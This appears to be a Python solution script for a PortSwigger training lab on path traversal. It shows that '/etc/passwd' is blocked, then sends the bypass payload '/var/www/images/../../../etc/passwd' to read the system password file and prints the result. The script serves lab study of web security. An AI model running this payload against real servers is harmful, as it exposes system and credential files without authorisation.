# Lab 05 — File path traversal, validation of start of path
# PortSwigger: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
#
# Vulnerability: The app validates that the supplied path STARTS WITH the
#                expected directory, but resolves ../ sequences AFTER that
#                check has already passed
# Aim:           Retrieve the contents of /etc/passwd
#
# Technique:
#   Prefix the payload with the required starting directory, then append
#   enough ../ sequences to escape it once the OS resolves the full path.
#
# Usage: python path_traversal_lab05.py <url>

import sys
import urllib3
from proxies import proxies
from path_traversal_utils import banner, section, make_session, try_traversal_payload, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BLOCKED_PAYLOAD = "/etc/passwd"
EXPECTED_PREFIX = "/var/www/images"
BYPASS_PAYLOAD  = f"{EXPECTED_PREFIX}/../../../etc/passwd"

if __name__ == "__main__":
    banner()
    section("LAB 05 — VALIDATION OF START OF PATH")

    if len(sys.argv) != 2:
        print("  Usage: python path_traversal_lab05.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: confirm a bare absolute path is blocked (wrong prefix) ──────
    print("  ── Step 1: confirm a path without the expected prefix is blocked\n")
    try_traversal_payload(session, url, "/image", "filename", BLOCKED_PAYLOAD,
                           label="No expected prefix (blocked)")

    # ── Step 2: prefix + traversal bypass ────────────────────────────────────
    print("\n  ── Step 2: prepend the expected prefix, then traverse out of it\n")
    print(f"  ℹ  Payload: {BYPASS_PAYLOAD}")
    print(f"  ℹ  Starts-with check passes ('{EXPECTED_PREFIX}' prefix present)")
    print(f"  ℹ  Path resolves AFTER the check → escapes to /etc/passwd\n")

    r = try_traversal_payload(session, url, "/image", "filename", BYPASS_PAYLOAD,
                               label="Prefix + traversal bypass")

    if "root:" in r.text:
        print_box("/etc/passwd contents (truncated)", r.text[:800])
    else:
        print("\n  ✘  /etc/passwd contents not found — inspect manually")
        print("     The expected prefix directory name may differ on this")
        print("     lab instance — check the error message for a hint.")
        print_box("Raw response snippet", r.text[:400])
